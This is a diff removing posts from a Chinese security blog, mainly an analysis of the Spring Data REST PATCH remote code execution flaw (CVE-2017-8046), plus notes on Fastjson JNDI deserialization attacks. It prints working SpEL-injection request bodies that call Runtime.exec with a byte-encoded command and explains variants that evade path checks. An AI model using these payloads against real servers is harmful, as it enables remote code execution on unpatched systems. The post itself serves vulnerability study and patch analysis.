-<p>这里面就调用InitialContext的lookup方法，而且找到的就是我们前面设置的DataSourceName(),达到远程调用任意类的目的。由于JdbcRowSetImpl是官方自带的库，所以这个PoC的威力相对来说更厉害。如果还在使用Fastjson 1.2.24版本及以下烦请升级。</p>
-<p>引用：<br>1，<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a><br>2,<a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/11/23/Java JSON反序列化之殇-看雪安全开发者峰会/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/11/23/Java JSON反序列化之殇-看雪安全开发者峰会/" itemprop="url">
-                  Java JSON反序列化之殇-看雪安全开发者峰会
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-23T01:26:48+08:00">
-                2017-11-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/反序列化/" itemprop="url" rel="index">
-                    <span itemprop="name">反序列化</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/11/23/Java JSON反序列化之殇-看雪安全开发者峰会/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/11/23/Java JSON反序列化之殇-看雪安全开发者峰会/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2017/11/23/Java JSON反序列化之殇-看雪安全开发者峰会/" class="leancloud_visitors" data-flag-title="Java JSON反序列化之殇-看雪安全开发者峰会">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><p>这是我在看雪2017安全开发者峰会的议题《Java JSON反序列之殇》的内容，主要涉及Java JSON常用库GSON，Jackson，Fastjson的使用，安全特性，反序列化安全特性，Fastjson架构，Fastjson RCE的PoC，从TemplateImpl，JNDI Bean Property和JNDI Field做了分类整理分析，最后会涉及JAVA JSON反序列化防御和Java反序列化防御。详情请参考PPT内容。pdf无法显示，直接右键另存为即可或者从github上下载：<code>https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf</code><br>
-
-	<div class="row">
-    <embed src="https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/10/02/Spring Data Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/10/02/Spring Data Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析/" itemprop="url">
-                  Spring Data Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-02T10:12:14+08:00">
-                2017-10-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/spring/" itemprop="url" rel="index">
-                    <span itemprop="name">spring</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/10/02/Spring Data Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/10/02/Spring Data Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2017/10/02/Spring Data Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析/" class="leancloud_visitors" data-flag-title="Spring Data Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="1-综述"><a href="#1-综述" class="headerlink" title="1 综述"></a>1 综述</h2><p>  近日，Pivotal官方发布通告表示Spring-data-rest服务器在处理PATCH请求时存在一个远程代码执行漏洞（CVE-2017-8046）。攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。官方已经发布了新版本修复了该漏洞。</p>
-<p>相关地址：<br><a href="https://pivotal.io/security/cve-2017-8046" target="_blank" rel="external">https://pivotal.io/security/cve-2017-8046</a></p>
-<p>受影响的版本</p>
-<ul>
-<li>Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3</li>
-<li>Spring Boot version &lt; 2.0.0M4</li>
-<li>Spring Data release trains &lt; Kay-RC3</li>
-</ul>
-<p>不受影响的版本</p>
-<ul>
-<li>Spring Data REST 2.5.12, 2.6.7, 3.0RC3</li>
-<li>Spring Boot 2.0.0.M4</li>
-<li>Spring Data release train Kay-RC3</li>
-</ul>
-<p>解决方案<br>官方已经发布了新版本修复了该漏洞，受影响的用户请尽快升级至最新版本来防护该漏洞。</p>
-<p>参考链接：<br><a href="https://projects.spring.io/spring-data-rest/" target="_blank" rel="external">https://projects.spring.io/spring-data-rest/</a><br><a href="https://projects.spring.io/spring-boot/" target="_blank" rel="external">https://projects.spring.io/spring-boot/</a></p>
-<h2 id="2-补丁分析："><a href="#2-补丁分析：" class="headerlink" title="2 补丁分析："></a>2 补丁分析：</h2><p>从官方的描述来看就是就是Spring-data-rest服务处理PATCH请求不当，导致任意表达式执行从而导致的RCE。<br>首先来看下补丁，主要是evaluateValueFromTarget添加了一个校验方法verifyPath，对于不合规格的path直接报异常退出，主要是property.from(pathSource,type)实现，基本逻辑就是通过反射去验证该Field是否存在于bean中。<br><img src="/images/17-8046-01.png" alt="1"></p>
-<h2 id="3-复现："><a href="#3-复现：" class="headerlink" title="3 复现："></a>3 复现：</h2><p>直接拉取<code>https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples</code>，找到spring-rest-data这个项目，直接用IDEA一步步导入进去即可，直接运行就能看到在本地的8080端口起了jetty服务。但是请注意这编译好的是最新版本，要引入漏洞，当然得老版本，修改pom.xml,添加plugin，具体如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.data<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-data-rest-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0.RC2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>从项目test目录找到相关请求形式，发送<a href="http://127.0.0.1:8080/api/cities/1即可看到回显表明服务正常启动。测试poc的效果如下：" target="_blank" rel="external">http://127.0.0.1:8080/api/cities/1即可看到回显表明服务正常启动。测试poc的效果如下：</a><br><img src="/images/17-8046-02.png" alt="2"></p>
-<p>这个poc的几个关键点在于：Content-Type: application/json-patch+json，path路径一定得用斜杠/隔开，至于为什么，后续会讲到。op支持的操作符很多，包括test，add，replace等都可以触发，op不同，path中添加的poc可以不一样，如op为test时就少了很多限制。如下是op为add时候的请求body。</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[&#123;<span class="attr">"op"</span>:<span class="string">"add"</span>,<span class="attr">"path"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;112, 105, 110, 103, 32, 49, 57, 50, 46, 49, 54, 56, 46, 51, 46, 49, 48, 54&#125;))/xxlegend"</span>&#125;]</div></pre></td></tr></table></figure>
-<p>执行ping 192.168.3.106</p>
-<h2 id="3-分析："><a href="#3-分析：" class="headerlink" title="3 分析："></a>3 分析：</h2><p>漏洞的触发过程详细分析见文档：<a href="https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA，这里已经描述的比较清楚，在这里不再重述，这篇文档后续的分析主要是对poc的一些解读。" target="_blank" rel="external">https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA，这里已经描述的比较清楚，在这里不再重述，这篇文档后续的分析主要是对poc的一些解读。</a><br>随便拿一个以前spring表达式注入的poc作为path的参数值，如poc：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[&#123;<span class="attr">"op"</span>:<span class="string">"add"</span>,<span class="attr">"path"</span>:<span class="string">"new java.lang.String(new byte[]&#123;70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66&#125;)"</span></div><div class="line">&#125;]</div></pre></td></tr></table></figure></p>
-<p>这个请求的特别之处在于path字段值后边没有了斜杠。<br>会报如下错误：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Caused by: org.springframework.expression.spel.SpelEvaluationException: EL1032E: setValue(ExpressionState, Object) not supported <span class="keyword">for</span> <span class="string">'class org.springframework.expression.spel.ast.ConstructorReference'</span></div><div class="line">    at org.springframework.expression.spel.ast.SpelNodeImpl.setValue(SpelNodeImpl.java:<span class="number">148</span>) </div><div class="line">    at org.springframework.expression.spel.standard.SpelExpression.setValue(SpelExpression.java:<span class="number">416</span>) </div><div class="line">    at org.springframework.data.rest.webmvc.json.patch.PatchOperation.addValue(PatchOperation.java:<span class="number">148</span>) </div><div class="line">    at org.springframework.data.rest.webmvc.json.patch.AddOperation.perform(AddOperation.java:<span class="number">48</span>) </div><div class="line">    at org.springframework.data.rest.webmvc.json.patch.Patch.apply(Patch.java:<span class="number">64</span>) </div><div class="line">    at org.springframework.data.rest.webmvc.config.JsonPatchHandler.applyPatch(JsonPatchHandler.java:<span class="number">91</span>) </div><div class="line">    at org.springframework.data.rest.webmvc.config.JsonPatchHandler.apply(JsonPatchHandler.java:<span class="number">83</span>)</div><div class="line">    at org.springframework.data.rest.webmvc.config.PersistentEntityResourceHandlerMethodArgumentResolver.readPatch(PersistentEntityResourceHandlerMethodArgumentResolver.java:<span class="number">200</span>)</div></pre></td></tr></table></figure></p>
-<p>说明path参数确实被污染，此处存在表达式注入漏洞，虽然已经进入表达式的执行流程，但是这里却报错退出。离RCE还差一步，查看org.springframework.expression.spel.ast.SpelNodeImpl.setValue方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">@Override</div><div class="line">public void setValue(ExpressionState expressionState, Object newValue) throws EvaluationException &#123;</div><div class="line">   throw new SpelEvaluationException(getStartPosition(),</div><div class="line">         SpelMessage.SETVALUE_NOT_SUPPORTED, getClass());</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这个方法直接抛出异常，那看来poc离执行还有一段距离。直接调出setValue的实现，发现有五个地方重写了该方法。SpelNodeImpl的setValue也在其中，但是它是直接抛出异常的，算一个异常检查吧。查看他们的实现，只有CompoundExpression,Indexer,PropertyOrFieldReference真正存在执行表达式。<br><img src="/images/17-8046-03.png" alt="3"></p>
-<p>查看相关文档得知 CompoundExpression是复杂表达式，用.连接起来的都算。<br>Indexer一般是这么表示test[xxlegend]，那么可以把poc改成<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[&#123;<span class="attr">"op"</span>:<span class="string">"add"</span>,<span class="attr">"path"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;112, 105, 110, 103, 32, 49, 57, 50, 46, 49, 54, 56, 46, 51, 46, 49, 48, 54&#125;))[xxlegend]"</span></div><div class="line">&#125;]</div></pre></td></tr></table></figure></p>
-<p>这也是可以运行的。再看调用栈也是符合我们刚才理解到<br>SpelExpression.setValue–》<br>     CompoundExpression.setValue–》<br>          CompoundExpression.getValueRef–》<br>               Indexer.getValueRef–》<br>                    PropertyOrFieldReference.getValueInternal–》<br>                         PropertyOrFieldReference.readProperty</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Caused by: org.springframework.expression.spel.SpelEvaluationException: EL1008E: Property or field <span class="string">'xxlegend'</span> cannot be found on object of type <span class="string">'sample.data.rest.domain.City'</span> - maybe not <span class="keyword">public</span>?</div><div class="line">    at org.springframework.expression.spel.ast.PropertyOrFieldReference.readProperty(PropertyOrFieldReference.java:<span class="number">224</span>) ~[spring-expression-<span class="number">4.3</span>.7.RELEASE.jar:<span class="number">4.3</span>.7.RELEASE]</div><div class="line">    at org.springframework.expression.spel.ast.PropertyOrFieldReference.getValueInternal(PropertyOrFieldReference.java:<span class="number">94</span>) ~[spring-expression-<span class="number">4.3</span>.7.RELEASE.jar:<span class="number">4.3</span>.7.RELEASE]</div><div class="line">    at org.springframework.expression.spel.ast.PropertyOrFieldReference.getValueInternal(PropertyOrFieldReference.java:<span class="number">81</span>) ~[spring-expression-<span class="number">4.3</span>.7.RELEASE.jar:<span class="number">4.3</span>.7.RELEASE]</div><div class="line">    at org.springframework.expression.spel.ast.Indexer.getValueRef(Indexer.java:<span class="number">123</span>) ~[spring-expression-<span class="number">4.3</span>.7.RELEASE.jar:<span class="number">4.3</span>.7.RELEASE]</div><div class="line">    at org.springframework.expression.spel.ast.CompoundExpression.getValueRef(CompoundExpression.java:<span class="number">66</span>) ~[spring-expression-<span class="number">4.3</span>.7.RELEASE.jar:<span class="number">4.3</span>.7.RELEASE]</div><div class="line">    at org.springframework.expression.spel.ast.CompoundExpression.setValue(CompoundExpression.java:<span class="number">95</span>) ~[spring-expression-<span class="number">4.3</span>.7.RELEASE.jar:<span class="number">4.3</span>.7.RELEASE]</div><div class="line">    at org.springframework.expression.spel.standard.SpelExpression.setValue(SpelExpression.java:<span class="number">416</span>) ~[spring-expression-<span class="number">4.3</span>.7.RELEASE.jar:<span class="number">4.3</span>.7.RELEASE]</div><div class="line">    at org.springframework.data.rest.webmvc.json.patch.PatchOperation.addValue(PatchOperation.java:<span class="number">148</span>) ~[spring-data-rest-webmvc-<span class="number">3.0</span>.0.RC2.jar:na]</div><div class="line">    at org.springframework.data.rest.webmvc.json.patch.AddOperation.perform(AddOperation.java:<span class="number">48</span>) ~[spring-data-rest-webmvc-<span class="number">3.0</span>.0.RC2.jar:na]</div><div class="line">    at org.springframework.data.rest.webmvc.json.patch.Patch.apply(Patch.java:<span class="number">64</span>) ~[spring-data-rest-webmvc-<span class="number">3.0</span>.0.RC2.jar:na]</div><div class="line">    at org.springframework.data.rest.webmvc.config.JsonPatchHandler.applyPatch(JsonPatchHandler.java:<span class="number">91</span>) ~[spring-data-rest-webmvc-<span class="number">3.0</span>.0.RC2.jar:na]</div><div class="line">    at org.springframework.data.rest.webmvc.config.JsonPatchHandler.apply(JsonPatchHandler.java:<span class="number">83</span>) ~[spring-data-rest-webmvc-<span class="number">3.0</span>.0.RC2.jar:na]</div><div class="line">    at org.springframework.data.rest.webmvc.config.PersistentEntityResourceHandlerMethodArgumentResolver.readPatch(PersistentEntityResourceHandlerMethodArgumentResolver.java:<span class="number">200</span>) ~[spring-data-rest-webmvc-<span class="number">3.0</span>.0.RC2.jar:na]</div></pre></td></tr></table></figure>
-<p>前面都是讲path参数，也就是表达式的写法。在这个poc中还用到op参数，op表示要执行的动作，在代码中定义了add,copy,from,move,replace,test这么多操作值，add，test，replace可直接触发漏洞，并且test非常直接，path参数值无需斜杠<code>/，[]</code>来分割，poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[&#123;&quot;op&quot;:&quot;test&quot;,&quot;path&quot;:&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;112, 105, 110, 103, 32, 49, 57, 50, 46, 49, 54, 56, 46, 51, 46, 49, 48, 54&#125;))&quot;</div><div class="line">&#125;]</div></pre></td></tr></table></figure></p>
-<p>很明显这个poc的path参数值无线跟<code>/ []</code>来分割参数。原因就是它调用的是SpelExpression.getValue，而非test情况下的poc最终调用的都是SpelExpression.setValue，通过setValue调用getValueRef来达到表达式注入。<br>下面看看test的调用栈：<br><img src="/images/17-8046-04.png" alt="4"><br>这个点官方也没修，但是有个限制：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line">&lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">perform</span><span class="params">(Object target, Class&lt;T&gt; type)</span> </span>&#123;</div><div class="line"></div><div class="line">   Object expected = normalizeIfNumber(evaluateValueFromTarget(target, type));</div><div class="line">   Object actual = normalizeIfNumber(getValueFromTarget(target));</div><div class="line"></div><div class="line">   <span class="keyword">if</span> (!ObjectUtils.nullSafeEquals(expected, actual)) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> PatchException(<span class="string">"Test against path '"</span> + path + <span class="string">"' failed."</span>);</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>evaluateValueFromTarget运行在前，会报错退出，导致getValueFromTarget不会被执行，怎么绕过去呢？值得思考。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2295,7 +2268,7 @@ class java.lang.ProcessBuilder</code></p>
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">31</span>
+                <span class="site-state-item-count">32</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2316,8 +2289,8 @@ class java.lang.ProcessBuilder</code></p>
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">111</span>
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">113</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
